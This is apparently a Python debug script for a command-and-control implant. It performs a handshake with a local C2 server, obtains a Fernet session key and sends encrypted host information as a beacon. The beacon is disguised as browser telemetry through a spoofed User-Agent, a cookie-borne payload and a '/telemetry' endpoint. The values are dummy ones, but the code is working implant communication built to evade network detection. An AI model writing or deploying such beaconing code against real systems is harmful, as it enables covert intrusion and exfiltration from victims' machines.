#!/usr/bin/env python3
"""
Debug beacon response
"""

import requests
import json
import hashlib
import base64
from cryptography.fernet import Fernet

C2_URL = "http://127.0.0.1:4444"

# Handshake
fingerprint = "debug_fingerprint"
implant_id = "debug_implant"
implant_id_hash = hashlib.md5(implant_id.encode()).hexdigest()[:8]

handshake_data = {
    "fingerprint": fingerprint,
    "implant_id": implant_id,
    "implant_id_hash": implant_id_hash,
}

print("Handshake...")
response = requests.post(f"{C2_URL}/handshake", json=handshake_data, timeout=10)
print(f"Status: {response.status_code}")
print(f"Headers: {response.headers}")
print(f"Text: {response.text[:200]}...")

result = response.json()
session_key_b64 = result.get("key")

# Prepare beacon
fernet = Fernet(session_key_b64.encode())

beacon_data = {
    "system_info": {
        "hostname": "debug-host",
        "platform": "linux"
    }
}

json_data = json.dumps(beacon_data).encode()
encrypted_data = fernet.encrypt(json_data)
encoded_data = base64.b64encode(encrypted_data).decode()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": f"session={encoded_data}",
    "Authorization": f"Bearer {implant_id}",
    "Content-Type": "application/json"
}

print(f"\nBeacon with Authorization: Bearer {implant_id}")
beacon_response = requests.post(
    f"{C2_URL}/api/v1/telemetry",
    headers=headers,
    data="",
    timeout=10
)

print(f"Beacon Status: {beacon_response.status_code}")
print(f"Beacon Headers: {beacon_response.headers}")
print(f"Beacon Text (first 500 chars):")
print(beacon_response.text[:500])
print(f"\nBeacon Text length: {len(beacon_response.text)}")

# Try to parse as JSON
try:
    json_result = beacon_response.json()
    print(f"\n✅ Beacon response is valid JSON:")
    print(json.dumps(json_result, indent=2))
except:
    print(f"\n⚠️ Beacon response is not JSON (might be empty or HTML)")